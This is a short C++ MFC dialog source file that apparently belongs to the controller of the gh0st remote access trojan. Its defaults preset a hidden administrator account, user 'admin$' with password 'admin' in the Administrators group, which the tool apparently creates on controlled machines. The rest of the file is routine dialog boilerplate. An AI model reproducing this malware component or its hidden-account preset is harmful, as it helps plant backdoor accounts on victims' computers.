// User.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "User.h"
#include "gh0stView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CUser dialog


CUser::CUser(CWnd* pParent /*=NULL*/)
: CDialog(CUser::IDD, pParent)
{
	//{{AFX_DATA_INIT(CUser)
	m_admin = _T("Administrators");
	m_net_pass = _T("admin");
	m_net_user = _T("admin$");
	//}}AFX_DATA_INIT
}


void CUser::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CUser)
	DDX_Text(pDX, IDC_EDIT_admin, m_admin);
	DDX_Text(pDX, IDC_EDIT_pass, m_net_pass);
	DDX_Text(pDX, IDC_EDIT_user, m_net_user);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CUser, CDialog)
//{{AFX_MSG_MAP(CUser)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CUser message handlers

void CUser::OnOK() 
{
	// TODO: Add extra validation here
	
	CDialog::OnOK();
}
